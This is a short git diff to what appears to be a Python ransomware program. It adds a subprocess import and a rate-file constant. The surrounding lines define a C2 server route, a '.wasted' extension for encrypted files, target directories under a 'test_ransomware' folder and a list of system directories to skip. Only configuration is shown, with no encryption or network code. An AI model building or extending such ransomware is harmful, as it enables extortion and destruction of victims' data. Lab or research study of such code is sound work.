@@ -1,3 +1,4 @@
+import subprocess
 from argparse import ArgumentParser
 from base64 import b64encode, b64decode
 from os import environ, path, rename, walk
@@ -23,6 +24,7 @@ C2_RW_ROUTE = "/rw/done"
 LINUX_STARTDIRS = [environ['HOME'] + '/test_ransomware']
 EXTENSION = ".wasted"  # Ransomware custom extension
 ROAR_DIR = "/roar"
+RATE_FILE = "rate.roar"
 
 # following list of important Linux system directories: https://tldp.org/LDP/abs/html/systemdirs.html
 SAFE_DIRS = ["/boot", "/bin", "/usr/bin", "/usr/local/bin", "/sbin", "/usr/sbin", "/lib", "/usr/lib", "/usr/local/lib",
